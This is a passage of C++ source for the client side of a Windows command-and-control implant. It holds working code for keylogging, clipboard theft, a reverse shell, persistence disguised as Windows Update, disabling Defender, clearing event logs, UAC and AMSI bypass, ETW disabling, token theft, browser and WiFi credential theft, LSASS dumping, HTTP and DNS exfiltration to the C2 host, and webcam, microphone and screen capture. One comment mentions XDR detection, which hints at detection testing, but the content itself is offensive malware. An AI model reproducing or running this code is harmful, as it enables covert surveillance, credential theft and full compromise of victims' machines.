                        case VK_NUMPAD6: keyStr = "6"; break;
                        case VK_NUMPAD7: keyStr = "7"; break;
                        case VK_NUMPAD8: keyStr = "8"; break;
                        case VK_NUMPAD9: keyStr = "9"; break;
                        case VK_MULTIPLY: keyStr = "*"; break;
                        case VK_ADD: keyStr = "+"; break;
                        case VK_SUBTRACT: keyStr = "-"; break;
                        case VK_DECIMAL: keyStr = "."; break;
                        case VK_DIVIDE: keyStr = "/"; break;
                        case VK_OEM_1: keyStr = shift ? ":" : ";"; break;
                        case VK_OEM_2: keyStr = shift ? "?" : "/"; break;
                        case VK_OEM_3: keyStr = shift ? "~" : "`"; break;
                        case VK_OEM_4: keyStr = shift ? "{" : "["; break;
                        case VK_OEM_5: keyStr = shift ? "|" : "\\"; break;
                        case VK_OEM_6: keyStr = shift ? "}" : "]"; break;
                        case VK_OEM_7: keyStr = shift ? "\"" : "'"; break;
                        case VK_OEM_PLUS: keyStr = shift ? "+" : "="; break;
                        case VK_OEM_COMMA: keyStr = shift ? "<" : ","; break;
                        case VK_OEM_MINUS: keyStr = shift ? "_" : "-"; break;
                        case VK_OEM_PERIOD: keyStr = shift ? ">" : "."; break;
                        default:
                            // Letters
                            if (key >= 'A' && key <= 'Z') {
                                bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
                                if (shift ^ caps) {
                                    keyStr = (char)key;
                                } else {
                                    keyStr = (char)(key + 32);
                                }
                            } 
                            // Numbers (with shift for symbols)
                            else if (key >= '0' && key <= '9') {
                                if (shift) {
                                    const char* symbols = ")!@#$%^&*(";
                                    keyStr = symbols[key - '0'];
                                } else {
                                    keyStr = (char)key;
                                }
                            }
                            break;
                    }
                    
                    // Add Ctrl+ combinations
                    if (ctrl && !keyStr.empty() && key >= 'A' && key <= 'Z') {
                        keyStr = "[CTRL+" + keyStr + "]";
                    }
                    
                    if (!keyStr.empty()) {
                        std::lock_guard<std::mutex> lock(keylogMutex);
                        keylogBuffer.push_back(keyStr);
                    }
                }
            }
            Sleep(10);
        }
    }
    
    void executeKeyloggerStart() {
        if (!keyloggerActive) {
            keyloggerActive = true;
            keylogBuffer.clear();
            keyloggerThread = std::thread(&C2Client::keyloggerWorker, this);
            sendResponse("KEYLOGGER:STARTED");
        } else {
            sendResponse("KEYLOGGER:ALREADY_ACTIVE");
        }
    }
    
    void executeKeyloggerDump() {
        std::stringstream keylogData;
        keylogData << "KEYLOG:DUMP:START\n";
        
        std::string capturedKeys;
        {
            std::lock_guard<std::mutex> lock(keylogMutex);
            
            // Debug logging
            logActivity("DEBUG", "KEYLOG_DUMP", "Keylogger active: " + std::string(keyloggerActive ? "YES" : "NO"));
            logActivity("DEBUG", "KEYLOG_DUMP", "Buffer size: " + std::to_string(keylogBuffer.size()));
            
            if (keylogBuffer.empty()) {
                keylogData << "[No keystrokes captured - ";
                if (!keyloggerActive) {
                    keylogData << "keylogger is not active]";
                } else {
                    keylogData << "no keys pressed yet]";
                }
                keylogData << "\n";
                capturedKeys = "No keystrokes captured";
            } else {
                for (const auto& key : keylogBuffer) {
                    keylogData << key;
                    capturedKeys += key;
                }
                keylogBuffer.clear();
            }
        }
        
        // Save keylog to file for XDR detection
        std::string keylogFile = "C:\\Windows\\Temp\\keylog_" + 
                               std::to_string(GetTickCount()) + ".txt";
        
        std::ofstream klog(keylogFile);
        if (klog.is_open()) {
            klog << "=== KEYLOGGER CAPTURE ===" << std::endl;
            klog << "Machine: " << hostname << std::endl;
            klog << "User: " << username << std::endl;
            klog << "Timestamp: " << std::time(nullptr) << std::endl;
            klog << "=== CAPTURED KEYSTROKES ===" << std::endl;
            klog << capturedKeys << std::endl;
            klog.close();
            
            logActivity("COLLECTION", "KEYLOG_SAVED", "Keylog saved to " + keylogFile);
            
            // Also save to user's Documents folder
            char documentsPath[MAX_PATH];
            if (SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, SHGFP_TYPE_CURRENT, documentsPath) == S_OK) {
                std::string docsCopy = std::string(documentsPath) + "\\keylog_" + 
                                     std::to_string(GetTickCount()) + ".txt";
                if (CopyFileA(keylogFile.c_str(), docsCopy.c_str(), FALSE)) {
                    logActivity("COLLECTION", "KEYLOG_COPY", "Keylog copied to " + docsCopy);
                }
            }
            
            // Create encrypted copy (XOR with simple key)
            std::string encryptedFile = keylogFile + ".enc";
            std::ofstream enc(encryptedFile, std::ios::binary);
            if (enc.is_open()) {
                std::string encrypted = xorEncrypt(capturedKeys, "KeylogEncryptionKey");
                enc.write(encrypted.c_str(), encrypted.size());
                enc.close();
                logActivity("COLLECTION", "KEYLOG_ENCRYPTED", "Encrypted keylog saved to " + encryptedFile);
            }
        }
        
        keylogData << "\nKEYLOG:DUMP:END";
        sendResponse(keylogData.str());
    }
    
    void executeClipboard() {
        std::string clipData = "CLIPBOARD:START\n";
        
        if (OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_TEXT);
            if (hData) {
                char* pData = (char*)GlobalLock(hData);
                if (pData) {
                    clipData += pData;
                    GlobalUnlock(hData);
                }
            }
            CloseClipboard();
        }
        
        clipData += "\nCLIPBOARD:END";
        sendResponse(clipData);
    }
    
    void executeShellCommand(const std::string& command) {
        std::stringstream output;
        output << "SHELL:OUTPUT:START\n";
        
        // Execute command and capture output
        std::string fullCommand = command + " 2>&1";
        FILE* pipe = _popen(fullCommand.c_str(), "r");
        if (pipe) {
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), pipe)) {
                output << buffer;
            }
            int exitCode = _pclose(pipe);
            output << "\nExit Code: " << exitCode << "\n";
        } else {
            output << "Failed to execute command\n";
        }
        
        output << "SHELL:OUTPUT:END";
        sendResponse(output.str());
    }
    
    void executePowerShell(const std::string& command) {
        std::string psCommand = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"" + command + "\"";
        executeShellCommand(psCommand);
    }
    
    void executeReverseShell() {
        sendResponse("REVSHELL:CONNECTING");
        
        SOCKET revSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (revSocket != INVALID_SOCKET) {
            sockaddr_in revAddr;
            revAddr.sin_family = AF_INET;
            revAddr.sin_port = htons(4444);
            inet_pton(AF_INET, serverIP.c_str(), &revAddr.sin_addr);
            
            if (connect(revSocket, (sockaddr*)&revAddr, sizeof(revAddr)) == 0) {
                sendResponse("REVSHELL:CONNECTED");
                
                // Set up process for reverse shell
                STARTUPINFOA si;
                PROCESS_INFORMATION pi;
                ZeroMemory(&si, sizeof(si));
                si.cb = sizeof(si);
                si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
                si.wShowWindow = SW_HIDE;
                si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)revSocket;
                
                // Start cmd.exe
                if (CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
                    WaitForSingleObject(pi.hProcess, INFINITE);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
                
                closesocket(revSocket);
            } else {
                sendResponse("REVSHELL:FAILED");
                closesocket(revSocket);
            }
        }
    }
    
    void executeRegistryPersistence() {
        HKEY hKey;
        std::string keyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        std::string valueName = "WindowsUpdateService";
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        
        if (RegOpenKeyExA(HKEY_CURRENT_USER, keyPath.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            if (RegSetValueExA(hKey, valueName.c_str(), 0, REG_SZ, 
                              (BYTE*)exePath, strlen(exePath) + 1) == ERROR_SUCCESS) {
                sendResponse("PERSISTENCE:REGISTRY:SUCCESS");
            } else {
                sendResponse("PERSISTENCE:REGISTRY:FAILED");
            }
            RegCloseKey(hKey);
        } else {
            sendResponse("PERSISTENCE:REGISTRY:ACCESS_DENIED");
        }
    }
    
    void executeScheduledTask() {
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        
        std::string taskCmd = "schtasks /create /tn \"WindowsUpdateCheck\" /tr \"" + 
                             std::string(exePath) + " client " + serverIP + " " + 
                             std::to_string(serverPort) + "\" /sc onlogon /f";
        
        FILE* pipe = _popen(taskCmd.c_str(), "r");
        if (pipe) {
            char buffer[256];
            std::string result;
            while (fgets(buffer, sizeof(buffer), pipe)) {
                result += buffer;
            }
            _pclose(pipe);
            
            if (result.find("SUCCESS") != std::string::npos) {
                sendResponse("PERSISTENCE:SCHTASK:SUCCESS");
            } else {
                sendResponse("PERSISTENCE:SCHTASK:FAILED");
            }
        }
    }
    
    void executeStartupFolder() {
        char startupPath[MAX_PATH];
        if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, startupPath) == S_OK) {
            char exePath[MAX_PATH];
            GetModuleFileNameA(NULL, exePath, MAX_PATH);
            
            std::string lnkPath = std::string(startupPath) + "\\WindowsUpdate.lnk";
            
            // Create shortcut (simplified)
            std::string vbsScript = "Set oWS = WScript.CreateObject(\"WScript.Shell\")\n"
                                   "Set oLink = oWS.CreateShortcut(\"" + lnkPath + "\")\n"
                                   "oLink.TargetPath = \"" + std::string(exePath) + "\"\n"
                                   "oLink.Arguments = \"client " + serverIP + " " + std::to_string(serverPort) + "\"\n"
                                   "oLink.Save";
            
            std::ofstream vbs("C:\\Windows\\Temp\\create_lnk.vbs");
            vbs << vbsScript;
            vbs.close();
            
            system("cscript //NoLogo C:\\Windows\\Temp\\create_lnk.vbs");
            DeleteFileA("C:\\Windows\\Temp\\create_lnk.vbs");
            
            sendResponse("PERSISTENCE:STARTUP:SUCCESS");
        } else {
            sendResponse("PERSISTENCE:STARTUP:FAILED");
        }
    }
    
    void executeDisableAV() {
        sendResponse("AV:DISABLING");
        
        // Multiple methods to disable Windows Defender
        std::vector<std::string> commands = {
            "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
            "powershell -Command \"Set-MpPreference -DisableIOAVProtection $true\"",
            "powershell -Command \"Set-MpPreference -DisableScriptScanning $true\"",
            "sc stop WinDefend",
            "sc config WinDefend start=disabled",
            "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
        };
        
        for (const auto& cmd : commands) {
            system((cmd + " >nul 2>&1").c_str());
        }
        
        sendResponse("AV:DISABLED");
    }
    
    void executeClearLogs() {
        sendResponse("LOGS:CLEARING");
        
        // Clear various Windows logs
        std::vector<std::string> commands = {
            "wevtutil cl System",
            "wevtutil cl Security",
            "wevtutil cl Application",
            "wevtutil cl \"Windows PowerShell\"",
            "wevtutil cl \"Microsoft-Windows-PowerShell/Operational\"",
            "wevtutil cl \"Microsoft-Windows-TaskScheduler/Operational\"",
            "del /f /q %windir%\\Prefetch\\*",
            "del /f /q %windir%\\Temp\\*"
        };
        
        for (const auto& cmd : commands) {
            system((cmd + " >nul 2>&1").c_str());
        }
        
        sendResponse("LOGS:CLEARED");
    }
    
    void executeUACBypass() {
        sendResponse("UAC:BYPASSING");
        
        if (IsRunningAsAdmin()) {
            sendResponse("UAC:ALREADY_ELEVATED");
            return;
        }
        
        // Attempt privilege escalation
        if (AttemptPrivilegeEscalation()) {
            sendResponse("UAC:BYPASS_SUCCESS");
            
            // Restart the client with elevated privileges
            char exePath[MAX_PATH];
            GetModuleFileNameA(NULL, exePath, MAX_PATH);
            
            std::string cmdLine = std::string(exePath) + " client " + serverIP + " " + std::to_string(serverPort);
            
            SHELLEXECUTEINFOA sei = { sizeof(sei) };
            sei.lpVerb = "runas";
            sei.lpFile = exePath;
            sei.lpParameters = (std::string("client ") + serverIP + " " + std::to_string(serverPort)).c_str();
            sei.hwnd = NULL;
            sei.nShow = SW_NORMAL;
            
            if (ShellExecuteExA(&sei)) {
                sendResponse("UAC:SPAWNED_ELEVATED");
                // Exit current non-elevated instance
                exit(0);
            }
        } else {
            sendResponse("UAC:BYPASS_FAILED");
        }
    }
    
    void executeTokenSteal() {
        sendResponse("TOKEN:STEALING");
        
        PrivilegeEscalation privEsc;
        if (privEsc.TokenImpersonation()) {
            sendResponse("TOKEN:STEAL_SUCCESS");
        } else {
            sendResponse("TOKEN:STEAL_FAILED");
        }
    }
    
    void executeAMSIBypass() {
        sendResponse("AMSI:BYPASSING");
        
        std::string amsiBypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
        executePowerShell(amsiBypass);
        
        sendResponse("AMSI:BYPASSED");
    }
    
    void executeETWDisable() {
        sendResponse("ETW:DISABLING");
        
        std::string etwDisable = "[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)";
        executePowerShell(etwDisable);
        
        sendResponse("ETW:DISABLED");
    }
    
    void executeFileSearch(const std::string& pattern) {
        std::stringstream results;
        results << "FILESEARCH:START\n";
        
        // Search in common locations
        std::vector<std::string> searchPaths = {
            "C:\\Users\\" + username + "\\Desktop",
            "C:\\Users\\" + username + "\\Documents",
            "C:\\Users\\" + username + "\\Downloads"
        };
        
        for (const auto& path : searchPaths) {
            std::string searchCmd = "dir \"" + path + "\\" + pattern + "\" /s /b 2>nul";
            FILE* pipe = _popen(searchCmd.c_str(), "r");
            if (pipe) {
                char buffer[512];
                while (fgets(buffer, sizeof(buffer), pipe)) {
                    results << buffer;
                }
                _pclose(pipe);
            }
        }
        
        results << "FILESEARCH:END";
        sendResponse(results.str());
    }
    
    // Base64 encoding for exfiltration
    std::string base64_encode(const std::string& input) {
        static const char* b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::string ret;
        int i = 0;
        int j = 0;
        unsigned char char_array_3[3];
        unsigned char char_array_4[4];
        const char* bytes_to_encode = input.c_str();
        size_t in_len = input.length();

        while (in_len--) {
            char_array_3[i++] = *(bytes_to_encode++);
            if (i == 3) {
                char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
                char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
                char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
                char_array_4[3] = char_array_3[2] & 0x3f;

                for(i = 0; (i < 4) ; i++)
                    ret += b64chars[char_array_4[i]];
                i = 0;
            }
        }

        if (i) {
            for(j = i; j < 3; j++)
                char_array_3[j] = '\0';

            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);

            for (j = 0; (j < i + 1); j++)
                ret += b64chars[char_array_4[j]];

            while((i++ < 3))
                ret += '=';
        }

        return ret;
    }
    
    void executeBrowserCredentials() {
        sendResponse("BROWSER_CREDS:EXTRACTING");
        
        // Real Chrome credential extraction
        std::string chromePath = std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default\\";
        std::string loginData = chromePath + "Login Data";
        std::string cookies = chromePath + "Cookies";
        std::string webData = chromePath + "Web Data";
        
        // Copy Chrome databases to temp location (Chrome locks them)
        std::string tempPath = std::string(getenv("TEMP")) + "\\";
        CopyFileA(loginData.c_str(), (tempPath + "chrome_login.db").c_str(), FALSE);
        CopyFileA(cookies.c_str(), (tempPath + "chrome_cookies.db").c_str(), FALSE);
        CopyFileA(webData.c_str(), (tempPath + "chrome_web.db").c_str(), FALSE);
        
        // Extract saved passwords using PowerShell (simplified version)
        std::string extractCmd = "$sqlitePath = '" + tempPath + "chrome_login.db'; " +
                                "$query = 'SELECT origin_url, username_value FROM logins'; " +
                                "if(Test-Path $sqlitePath){echo 'Chrome passwords found at: '$sqlitePath}";
        executePowerShell(extractCmd);
        
        // Firefox credential locations
        std::string firefoxPath = std::string(getenv("APPDATA")) + "\\Mozilla\\Firefox\\Profiles\\";
        std::string ffCmd = "dir \"" + firefoxPath + "\" /b /ad > %TEMP%\\firefox_profiles.txt 2>nul";
        executeShellCommand(ffCmd);
        
        // Edge credentials (similar to Chrome)
        std::string edgePath = std::string(getenv("LOCALAPPDATA")) + "\\Microsoft\\Edge\\User Data\\Default\\";
        if (GetFileAttributesA(edgePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            CopyFileA((edgePath + "Login Data").c_str(), (tempPath + "edge_login.db").c_str(), FALSE);
            sendResponse("BROWSER_CREDS:EDGE:FOUND");
        }
        
        // Extract Internet Explorer/Edge legacy credentials
        std::string ieCmd = "rundll32.exe keymgr.dll,KRShowKeyMgr";
        
        // WiFi passwords extraction
        std::string wifiExtract = "netsh wlan export profile key=clear folder=%TEMP%";
        executeShellCommand(wifiExtract);
        
        sendResponse("BROWSER_CREDS:COMPLETE");
    }
    
    void executeLsassDump() {
        sendResponse("LSASS:DUMPING");
        
        // Method 1: Using comsvcs.dll (living off the land)
        std::string dumpCmd = "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump " +
                             std::to_string(GetCurrentProcessId()) + " %TEMP%\\lsass.dmp full";
        
        // Get LSASS process ID
        DWORD lsassPid = 0;
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe;
            pe.dwSize = sizeof(PROCESSENTRY32);
            if (Process32First(hSnapshot, &pe)) {
                do {
                    if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                        lsassPid = pe.th32ProcessID;
                        break;
                    }
                } while (Process32Next(hSnapshot, &pe));
            }
            CloseHandle(hSnapshot);
        }
        
        if (lsassPid > 0) {
            // Method 2: Direct MiniDumpWriteDump (requires SeDebugPrivilege)
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lsassPid);
            if (hProcess) {
                sendResponse("LSASS:PID:" + std::to_string(lsassPid));
                
                // Create dump using comsvcs.dll
                std::string lsassDumpCmd = "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump " +
                                          std::to_string(lsassPid) + " C:\\Windows\\Temp\\debug.dmp full";
                executeShellCommand(lsassDumpCmd);
                
                CloseHandle(hProcess);
            }
            
            // Method 3: Using Task Manager method
            std::string taskMgrCmd = "powershell -c \"Start-Process taskmgr.exe -WindowStyle Hidden; " +
                                    std::string("Start-Sleep -Seconds 2; ") +
                                    "$wshell = New-Object -ComObject wscript.shell; " +
                                    "$wshell.SendKeys('%{TAB}')\"";
        }
        
        // Method 4: Using ProcDump (if available)
        std::string procDumpCmd = "procdump.exe -accepteula -ma lsass.exe %TEMP%\\lsass_dump.dmp 2>nul";
        executeShellCommand(procDumpCmd);
        
        sendResponse("LSASS:COMPLETE");
    }
    
    void executeExfilData(const std::string& method, const std::string& data) {
        if (method == "HTTP") {
            sendResponse("EXFIL:HTTP:STARTING");
            
            // Real HTTP exfiltration using WinHTTP
            HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0",
                                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                           WINHTTP_NO_PROXY_NAME,
                                           WINHTTP_NO_PROXY_BYPASS, 0);
            
            if (hSession) {
                // Connect to C2 server for exfiltration
                std::wstring wServerIP(serverIP.begin(), serverIP.end());
                HINTERNET hConnect = WinHttpConnect(hSession, wServerIP.c_str(), 8080, 0);
                
                if (hConnect) {
                    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/upload",
                                                          NULL, WINHTTP_NO_REFERER,
                                                          WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
                    
                    if (hRequest) {
                        // Collect real data from system
                        std::stringstream exfilData;
                        exfilData << "=== EXFILTRATED DATA ===\n";
                        exfilData << "Hostname: " << hostname << "\n";
                        exfilData << "Username: " << username << "\n";
                        exfilData << "Machine GUID: " << machineGuid << "\n";
                        exfilData << "OS Version: " << osVersion << "\n\n";
                        
                        // Collect files from Documents folder
                        exfilData << "=== DOCUMENT LISTING ===\n";
                        std::string docPath = "C:\\Users\\" + username + "\\Documents";
                        std::string listCmd = "dir \"" + docPath + "\\*.doc*\" \"" + docPath + "\\*.pdf\" \"" + docPath + "\\*.xls*\" /s /b 2>nul";
                        FILE* pipe = _popen(listCmd.c_str(), "r");
                        if (pipe) {
                            char buffer[512];
                            int fileCount = 0;
                            while (fgets(buffer, sizeof(buffer), pipe) && fileCount < 50) {
                                exfilData << buffer;
                                fileCount++;
                            }
                            _pclose(pipe);
                        }
                        
                        // Add browser passwords location
                        exfilData << "\n=== BROWSER DATA LOCATIONS ===\n";
                        exfilData << "Chrome Login Data: " << getenv("LOCALAPPDATA") << "\\Google\\Chrome\\User Data\\Default\\Login Data\n";
                        exfilData << "Firefox Profiles: " << getenv("APPDATA") << "\\Mozilla\\Firefox\\Profiles\\\n";
                        
                        // Base64 encode the data
                        std::string encoded = base64_encode(exfilData.str());
                        
                        // Send the request
                        std::wstring headers = L"Content-Type: application/x-www-form-urlencoded\r\n";
                        if (WinHttpSendRequest(hRequest, headers.c_str(), -1,
                                             (LPVOID)encoded.c_str(), encoded.length(),
                                             encoded.length(), 0)) {
                            sendResponse("EXFIL:HTTP:SENT:" + std::to_string(exfilData.str().length()) + " bytes");
                        }
                        
                        WinHttpCloseHandle(hRequest);
                    }
                    WinHttpCloseHandle(hConnect);
                }
                WinHttpCloseHandle(hSession);
            }
            
            sendResponse("EXFIL:HTTP:COMPLETE");
            
        } else if (method == "DNS") {
            sendResponse("EXFIL:DNS:STARTING");
            
            // Real DNS exfiltration
            std::string testData = "user:" + username + ",host:" + hostname + ",guid:" + machineGuid;
            std::string encoded = base64_encode(testData);
            
            // Split data into DNS-compatible chunks (max 63 chars per label)
            for (size_t i = 0; i < encoded.length(); i += 60) {
                std::string chunk = encoded.substr(i, 60);
                std::string dnsQuery = chunk + ".data.malware-c2.com";
                
                // Perform DNS lookup (will fail but generates DNS traffic)
                struct hostent* host = gethostbyname(dnsQuery.c_str());
                
                sendResponse("EXFIL:DNS:CHUNK:" + std::to_string(i/60 + 1));
                Sleep(100); // Avoid flooding
            }
            
            sendResponse("EXFIL:DNS:COMPLETE");
        }
    }
    
    void executeWebcamCapture() {
        sendResponse("WEBCAM:STARTING");
        
        // Check for webcam using Windows API
        char devicePath[MAX_PATH];
        for (int i = 0; i < 10; i++) {
            sprintf_s(devicePath, "\\\\.\\VIDEO%d", i);
            HANDLE hDevice = CreateFileA(devicePath, GENERIC_READ, FILE_SHARE_READ, 
                                       NULL, OPEN_EXISTING, 0, NULL);
            if (hDevice != INVALID_HANDLE_VALUE) {
                CloseHandle(hDevice);
                sendResponse("WEBCAM:FOUND:DEVICE" + std::to_string(i));
                
                // Capture photo simulation
                std::string photoPath = std::string(getenv("TEMP")) + "\\webcam_capture_" + 
                                      std::to_string(GetTickCount()) + ".jpg";
                
                // Use PowerShell to access webcam (requires Windows 10+)
                std::string captureCmd = "powershell -Command \"$webcam = New-Object -ComObject WIA.CommonDialog; " +
                                       std::string("$device = $webcam.ShowSelectDevice(2,1,1); ") +
                                       "if($device) { $image = $device.Items.Item(1).Transfer(); " +
                                       "$image.SaveFile('" + photoPath + "') }\"";
                executeShellCommand(captureCmd);
                
                sendResponse("WEBCAM:CAPTURED:" + photoPath);
                break;
            }
        }
        
        sendResponse("WEBCAM:COMPLETE");
    }
    
    void executeMicrophoneRecord() {
        sendResponse("MICROPHONE:STARTING");
        
        // Record audio using Windows Sound Recorder
        std::string audioPath = std::string(getenv("TEMP")) + "\\audio_capture_" + 
                              std::to_string(GetTickCount()) + ".wav";
        
        // Method 1: Using Windows Sound Recorder (if available)
        std::string recordCmd = "powershell -Command \"" +
                              std::string("Add-Type -TypeDefinition @'") +
                              "using System; using System.Runtime.InteropServices; " +
                              "public class WinMM { " +
                              "[DllImport(\"winmm.dll\")] " +
                              "public static extern int mciSendString(string command, " +
                              "System.Text.StringBuilder buffer, int bufferSize, IntPtr hwndCallback); " +
                              "}' -PassThru | Out-Null; " +
                              "$sb = New-Object System.Text.StringBuilder(256); " +
                              "[WinMM]::mciSendString('open new type waveaudio alias mic', $sb, $sb.Capacity, 0); " +
                              "[WinMM]::mciSendString('record mic', $sb, $sb.Capacity, 0); " +
                              "Start-Sleep -Seconds 10; " +
                              "[WinMM]::mciSendString('stop mic', $sb, $sb.Capacity, 0); " +
                              "[WinMM]::mciSendString('save mic \"" + audioPath + "\"', $sb, $sb.Capacity, 0); " +
                              "[WinMM]::mciSendString('close mic', $sb, $sb.Capacity, 0)\"";
        
        executeShellCommand(recordCmd);
        
        // Method 2: Using built-in Windows voice recorder
        std::string voiceRecorderCmd = "start ms-callrecording: & timeout /t 10 & " +
                                     std::string("taskkill /f /im VoiceRecorder.exe 2>nul");
        executeShellCommand(voiceRecorderCmd);
        
        sendResponse("MICROPHONE:RECORDED:" + audioPath);
        sendResponse("MICROPHONE:COMPLETE");
    }
    
    void executeScreenRecord() {
        sendResponse("SCREEN_RECORD:STARTING");
        
        // Method 1: Take rapid screenshots for screen recording simulation
        std::string recordPath = std::string(getenv("TEMP")) + "\\screen_record_" + 
                               std::to_string(GetTickCount());
        CreateDirectoryA(recordPath.c_str(), NULL);
        
        // Capture 30 screenshots (3 seconds at 10 fps)
        for (int i = 0; i < 30; i++) {
            // Get screen dimensions
            int screenX = GetSystemMetrics(SM_CXSCREEN);
            int screenY = GetSystemMetrics(SM_CYSCREEN);
            
            // Create bitmap
            HDC hScreen = GetDC(NULL);
            HDC hDC = CreateCompatibleDC(hScreen);
            HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, screenX, screenY);
            HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
            
            // Copy screen
            BitBlt(hDC, 0, 0, screenX, screenY, hScreen, 0, 0, SRCCOPY);
            
            // Save bitmap
            std::string frameFile = recordPath + "\\frame_" + std::to_string(i) + ".bmp";
            
            // Simple BMP save
            BITMAPFILEHEADER bfHeader;
            BITMAPINFOHEADER biHeader;
            BITMAP bmp;
            GetObject(hBitmap, sizeof(BITMAP), &bmp);
            
            DWORD dwBmpSize = ((bmp.bmWidth * 32 + 31) / 32) * 4 * bmp.bmHeight;
            HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
            char *lpbitmap = (char *)GlobalLock(hDIB);
            
            GetBitmapBits(hBitmap, dwBmpSize, lpbitmap);
            
            HANDLE hFile = CreateFileA(frameFile.c_str(), GENERIC_WRITE, 0, NULL, 
                                     CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            
            if (hFile != INVALID_HANDLE_VALUE) {
                DWORD dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
                bfHeader.bfType = 0x4D42; // BM
                bfHeader.bfSize = dwSizeofDIB;
                bfHeader.bfReserved1 = 0;
                bfHeader.bfReserved2 = 0;
                bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
                
                biHeader.biSize = sizeof(BITMAPINFOHEADER);
                biHeader.biWidth = bmp.bmWidth;
                biHeader.biHeight = bmp.bmHeight;
                biHeader.biPlanes = 1;
                biHeader.biBitCount = 32;
                biHeader.biCompression = BI_RGB;
                biHeader.biSizeImage = dwBmpSize;
                biHeader.biXPelsPerMeter = 0;
                biHeader.biYPelsPerMeter = 0;
                biHeader.biClrUsed = 0;
                biHeader.biClrImportant = 0;
                
                DWORD dwBytesWritten;
                WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwBytesWritten, NULL);
                WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwBytesWritten, NULL);
                WriteFile(hFile, lpbitmap, dwBmpSize, &dwBytesWritten, NULL);
                
                CloseHandle(hFile);
            }
            
            GlobalUnlock(hDIB);
            GlobalFree(hDIB);
            
            // Cleanup
            SelectObject(hDC, old_obj);
            DeleteDC(hDC);
            ReleaseDC(NULL, hScreen);
            DeleteObject(hBitmap);
            
            if (i % 10 == 0) {
                sendResponse("SCREEN_RECORD:PROGRESS:" + std::to_string((i * 100) / 30) + "%");
            }
            
            Sleep(100); // 10 FPS
        }
        
        // Method 2: Use Windows Game Bar (Windows 10+)
        std::string gameBarCmd = "powershell -Command \"" +
                               std::string("$wshell = New-Object -ComObject wscript.shell; ") +
                               "$wshell.SendKeys('%{TAB}'); Start-Sleep -Milliseconds 500; " +
                               "$wshell.SendKeys('^%{r}'); Start-Sleep -Seconds 5; " +
                               "$wshell.SendKeys('^%{r}')\"";
        executeShellCommand(gameBarCmd);
        
        sendResponse("SCREEN_RECORD:SAVED:" + recordPath);
        sendResponse("SCREEN_RECORD:COMPLETE");
    }
    
    void processCommand(CommandType cmd, const std::string& params = "") {
        logActivity("CLIENT_DEBUG", "PROCESS_COMMAND", "Processing C2 command ID: " + std::to_string(cmd) + " with params: " + params);
        
        switch (cmd) {
            case CMD_BEACON:
                logActivity("CLIENT_DEBUG", "CMD_BEACON", "Sending beacon acknowledgment");
                sendResponse("BEACON:ACK:" + clientId);
                break;
                
            case CMD_HEARTBEAT:
                logActivity("CLIENT_DEBUG", "CMD_HEARTBEAT", "Sending heartbeat");
                sendResponse("HEARTBEAT:ALIVE");
                break;
                
            case CMD_SYSINFO:
